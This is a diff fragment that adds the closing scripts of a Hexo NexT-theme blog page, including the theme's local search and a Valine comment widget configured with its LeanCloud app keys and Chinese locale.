+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
